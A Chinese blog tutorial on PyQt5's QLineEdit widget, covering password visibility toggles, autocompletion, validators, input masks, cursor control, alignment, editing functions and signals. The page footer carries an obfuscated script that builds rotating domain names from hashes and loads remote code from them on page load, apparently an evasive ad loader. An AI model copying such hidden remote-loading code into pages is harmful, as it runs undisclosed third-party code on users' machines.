<p><img alt="" height="291" src="https://images2.imgbox.com/db/b9/nP7wCAtH_o.png" width="1200"></p> 
<blockquote> 
 <p>在密码输入框后面放一个小眼睛。自己控制明文还是暗文。 </p> 
</blockquote> 
<pre><code>#设置自定义操作(明文密文切换按钮)
action=QAction(self.pwd_le)
action.setIcon(QIcon('图片/闭眼.png'))
def change_cao():
    if self.pwd_le.echoMode()=='Normal':
        self.pwd_le.setEchoMode(QLineEdit.Password)
        action.setIcon(QIcon('图片/比眼.png'))
    else:
        self.pwd_le.setEchoMode(QLineEdit.Normal)
        action.setIcon(QIcon('图片/开眼.png'))
action.triggered.connect(change_cao)
self.pwd_le.addAct</code></pre> 
<p>效果展示：</p> 
<p><img alt="" height="348" src="https://images2.imgbox.com/3f/bc/lKwwtZNp_o.png" width="317"></p> 
<h3 id="11.6%20%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E8%81%94%E6%83%B3">11.6 自动补全联想</h3> 
<p><img alt="" height="234" src="https://images2.imgbox.com/a8/07/RmFpuZav_o.png" width="803"></p> 
<pre><code>completer=QCompleter(['zhang','Zhao','li','Huang','liu'],self.account_le)#指定一个父对象，当父亲被干掉后，儿子也离开
self.account_le.setCompleter(completer)#通过上下键选择，区分大小写</code></pre> 
<p>效果展示：</p> 
<p><img alt="" height="354" src="https://images2.imgbox.com/d5/d8/fL40ADKi_o.png" width="322"></p> 
<h3 id="11.7%20%E8%BE%93%E5%85%A5%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9%E9%99%90%E5%88%B6">11.7 输入文本内容限制</h3> 
<p><img alt="" height="377" src="https://images2.imgbox.com/80/4d/ZZxso4yi_o.png" width="773"></p> 
<h4 id="11.7.1%20%E9%95%BF%E5%BA%A6%E5%92%8C%E5%8F%AA%E8%AF%BB%E9%99%90%E5%88%B6">11.7.1 长度和只读限制</h4> 
<p> <img alt="" height="176" src="https://images2.imgbox.com/a5/b8/b6tsxJkQ_o.png" width="669"></p> 
<pre><code>#文本最大长度限制
le_a.setMaxLength(3)#无论字符还是汉字,最多三个
print('le_a允许输入的最大长度:',le_a.maxLength())

#只读设置
le_a.setReadOnly(False)#True:不允许手动修改    False:允许手动修改, 但都允许代码写入
le_a.setText('12345')</code></pre> 
<h4 id="11.7.2%C2%A0%20%E9%AA%8C%E8%AF%81%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8-%E8%AE%BE%E5%AE%9A%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E8%A7%84%E5%88%99">11.7.2  验证器的使用-设定用户输入规则</h4> 
<blockquote> 
 <p>给用户输入设定规则。 QValidator验证器，三种状态，合法（Acceptable），非法（Invalid），中间状态（Intermediate）。</p> 
</blockquote> 
<p><img alt="" height="80" src="https://images2.imgbox.com/87/d9/SX8NaqxO_o.png" width="644"></p> 
<p><img alt="" height="454" src="https://images2.imgbox.com/2f/f9/KZxIyHeZ_o.png" width="1200"></p> 
<p><strong>方式1：判断输入的内容 </strong></p> 
<pre><code>from PyQt5.Qt import *
import sys

class AgeVadidator(QValidator):
    def __init__(self):
        super().__init__()
    def validate(self,input_str,pos_int):#input_str:表示输入的内容. pos_int:表示光标的位置
        print(input_str,pos_int)
        #字符串应该都是由数字组成
        try:
            if 18&lt;=int(input_str)&lt;=180:
                # 返回元组数据,  input_str会跑到输入框里面,pos_int控制输入框光标的位置
                return (QValidator.Acceptable, input_str, pos_int)#Acceptable:表明输入的合法的
            elif 0&lt;=int(input_str)&lt;=9:#因为是输入一个数据读取一个数据
                return (QValidator.Intermediate, input_str, pos_int)#Intermediate中间值,不对也不错
            else:
                return (QValidator.Invalid, input_str, pos_int)#Invalid:表明输入的非法的
        except:
            #对空串判定,否则删不掉
            if len(input_str)==0:#表示删掉了输入内容
                return (QValidator.Intermediate, input_str, pos_int)
            return (QValidator.Invalid,input_str,pos_int)
    def fixup(self,p_str):#如果输入为中间状态,就会自动执行这个修复函数
        try:
            if int(p_str)&lt;18:
                return "18"
            else:
                return "180"
        except:
            return '18'

class Window(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('QLineEdit验证器的使用')
        self.resize(500,500)
        self.setup_ui()
        
    def setup_ui(self):
        le=QLineEdit(self)
        le.move(100,100)
        #18-180
        vadidator=AgeVadidator()
        le.setValidator(vadidator)


if __name__=='__main__':
    app = QApplication(sys.argv)
    window = Window()
    window.show()
    sys.exit(app.exec_())</code></pre> 
<p><strong>方式2：使用系统提供的子类</strong></p> 
<p><img alt="" height="177" src="https://images2.imgbox.com/f5/ec/Et6wq9Ws_o.png" width="730"></p> 
<pre><code>from PyQt5.Qt import *
import sys

class MyAgeVadidator(QIntValidator):
    def fixup(self,p_str):
        if int(p_str)==0 or int(p_str)&lt;18:#这两个条件不能调换顺序
            return '18'

class Window(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('QLineEdit验证器的使用')
        self.resize(500,500)
        self.setup_ui()
        
    def setup_ui(self):
        le=QLineEdit(self)
        le.move(100,100)
        #18-180
        #vadidator=AgeVadidator()
        #使用系统提供的子类
        #vadidator = QIntValidator(18,180)#整形数据的区间验证,QIntValidator功能不完善,所以需要自己写,(下限,上限)
        vadidator = MyAgeVadidator(18, 180)
        le.setValidator(vadidator)


if __name__=='__main__':
    app = QApplication(sys.argv)
    window = Window()
    window.show()
    sys.exit(app.exec_())</code></pre> 
<h4 id="11.7.3%20%E6%8E%A9%E7%A0%81%E9%99%90%E5%88%B6">11.7.3 掩码限制</h4> 
<p><img alt="" height="198" src="https://images2.imgbox.com/38/9f/FkAJabXf_o.png" width="741"></p> 
<blockquote> 
 <p>未输入之前，用掩码字符占位。</p> 
</blockquote> 
<p><img alt="" height="849" src="https://images2.imgbox.com/89/bf/leZv60iG_o.png" width="770"></p> 
<pre><code>le_a=QLineEdit(window)
le_a.move(100,100)
le_a.resize(150,30)

#设置掩码   [要求:共输入5位,"Cc-dd"]
le_a.setInputMask('&gt;AA-99;#')#当没输入时，用#占位
#座机号掩码：'9999-9999999;0'
</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="419" src="https://images2.imgbox.com/da/d1/lbqONxew_o.png" width="396"></p> 
<h3 id="11.8%20%E6%96%87%E6%9C%AC%E4%BF%AE%E6%94%B9%E7%8A%B6%E6%80%81">11.8 文本修改状态</h3> 
<p><img alt="" height="155" src="https://images2.imgbox.com/d4/1d/cc71vxOM_o.png" width="541"> </p> 
<pre><code>le_b=QLineEdit('b:',window)
le_b.move(100,200)
le_b.resize(150,30)

btn=QPushButton('按钮',window)
btn.move(70,350)
def cao():
    print('le_b是否处于编辑状态:',le_b.isModified())
    le_b.setModified(False)#修改状态改为False

btn.pressed.connect(cao)</code></pre> 
<h3 id="11.9%20%E5%85%89%E6%A0%87%E4%BD%8D%E7%BD%AE%E6%8E%A7%E5%88%B6">11.9 光标位置控制</h3> 
<p><img alt="" height="644" src="https://images2.imgbox.com/fd/de/RPJ35wwY_o.png" width="1082"></p> 
<pre><code>le=QLineEdit(window)
le.move(100,100)

btn=QPushButton(window)
btn.setText('按钮')
btn.move(100,200)
"""
    后——————————————————————&gt;前
    cursorBackward(bool mark,int steps=1)  向后(左)移动steps个字符  mark:带选中效果
    cursorForward(mark，steps)             向前（右）移动
    cursorWordBackward(mark)               向后（左）移动一个单词的距离
    cursorWordForward(mark)                向前（右）移动一个单词的距离
    home(bool mark)                        移动到行首,mark=True带选中效果
    end(bool mark)                         移动到行尾
    setCursorPosition(int)                 设置光标位置
    cursorPositionAt(const QPoint&amp;pos)     获取指定光标位置对应文本光标位置
"""
def cursor_move():
    le.cursorWordBackward(True)#只是移动，并不做其他事情，比如删除
    le.setFocus()
btn.clicked.connect(cursor_move)</code></pre> 
<h3 id="11.10%20%E6%96%87%E6%9C%AC%E8%BE%B9%E8%B7%9D%E8%AE%BE%E5%AE%9A">11.10 文本边距设定</h3> 
<p><img alt="" height="159" src="https://images2.imgbox.com/76/a1/Ehm81vrN_o.png" width="715"></p> 
<pre><code>le=QLineEdit(window)
le.move(100,100)
le.resize(300,300)
#设定文本编剧
#le.setContentsMargins(100,0,0,0)
le.setStyleSheet('background-color:cyan;')
le.setTextMargins(100,200,0,0)

btn=QPushButton(window)
btn.setText('按钮')
btn.move(50,50)</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="345" src="https://images2.imgbox.com/2b/51/IMv7ytKo_o.png" width="319"> </p> 
<h3 id="11.11%20%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F%C2%A0">11.11 对齐方式 </h3> 
<p><img alt="" height="519" src="https://images2.imgbox.com/8d/9f/kv0fp0Ne_o.png" width="1190"></p> 
<pre><code>#对其方式设定
le.setAlignment(Qt.AlignRight | Qt.AlignBottom)#同时设定多个对齐方式，按位或
</code></pre> 
<p>运行效果：</p> 
<p><img alt="" height="380" src="https://images2.imgbox.com/6d/87/2k8rfYhG_o.png" width="352"></p> 
<h3 id="11.12%20%E5%B8%B8%E7%94%A8%E7%BC%96%E8%BE%91%E5%8A%9F%E8%83%BD">11.12 常用编辑功能</h3> 
<p><img alt="" height="678" src="https://images2.imgbox.com/39/f4/95Sd9gEg_o.png" width="803"></p> 
<p><img alt="" height="297" src="https://images2.imgbox.com/2d/5c/1whLCaTo_o.png" width="660">  </p> 
<blockquote> 
 <p>QLineEdit右键已经提供这些功能。 当然我们作为开发人员，也可以使用提供的API。 </p> 
</blockquote> 
<p><img alt="" height="375" src="https://images2.imgbox.com/79/79/veAtXFz0_o.png" width="356"> </p> 
<pre><code>"""
backspace()         退格，类似于键盘的backspace
del_()              删除
clear()             清空
copy()              复制
cut()               剪切
paste()             粘贴
isUndoAvailable()   撤销   undo()
idRedoAvailable()   重做   redo()
setDragEnabled(bool)拖放  ==&gt;  选中文本后是否可以拖拽
"""</code></pre> 
<pre><code>#选中之后再复制，再粘贴
import numpy as np
le.cursorBackward(True,np.random.randint(10))#选中
le.copy()#内容复制到了系统的剪贴板里了
le.setCursorPosition(0)#设置粘贴到哪里
le.paste()</code></pre> 
<p>效果展示：</p> 
<p><img alt="" height="363" src="https://images2.imgbox.com/8d/87/wa7wiJbj_o.png" width="340"></p> 
<blockquote> 
 <pre>"""
文本选中：
setSelection(start_pos,length)      指定区间选择文本
selectAll()                         选中所有文本
deselect()                          取消选中已选文本
hasSelectedText()                   是否有选中文本
selectedText()     -&gt;str            获取选中文本
selectionStart()   -&gt;int            选中开始位置
selectionEnd()     -&gt;int            选中结束位置
selectionLength()  -&gt;int            选中的长度
"""
</pre> 
</blockquote> 
<h3 id="11.13%20%E4%BF%A1%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8">11.13 信号的使用</h3> 
<p><img alt="" height="246" src="https://images2.imgbox.com/3f/56/n3gV4KeA_o.png" width="852"></p> 
<blockquote> 
 <p>textEdited和textChanged这两个函数，在用户端界面输入时都会触发;<br> 而区别在于代码端能触发textChanged，不会触发textEdited。</p> 
</blockquote> 
<pre><code># ***************信号的使用***************开始
le_a=QLineEdit(window)
le_a.move(100,100)
le_a.resize(150,30)

#textEdited和textChanged这两个函数，在用户端界面输入时都会触发;
#而区别在于代码端能触发textChanged，不会触发textEdited
le_a.textEdited.connect(lambda val:print('文本框编辑时发生改变：',val))
le_a.textChanged.connect(lambda val:print('文本框内容发生改变：',val))
le_a.setText('kkk')

le_a.returnPressed.connect(lambda:print('回车键被换下'))
#光标位置发生改变触发
le_a.cursorPositionChanged.connect(lambda old_pos,new_pos:print('老位置：{},新位置：{}'.format(old_pos,new_pos)))
#选中文本位置发生改变触发
le_a.selectionChanged.connect(lambda:print('选中文本发生改变'))

# ***************信号的使用***************结束</code></pre> 
<p>运行结果：</p> 
<p><img alt="" height="548" src="https://images2.imgbox.com/54/43/pEvvzmHg_o.png" width="969"></p> 
<p> </p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/110e7366732d7cc3aa5940c2d029042f/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">关于双符号数溢出的理解</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/8036f080a0eb8ab14b55bedd2d31fb46/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">iOS中需要避免的内存泄漏总结</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>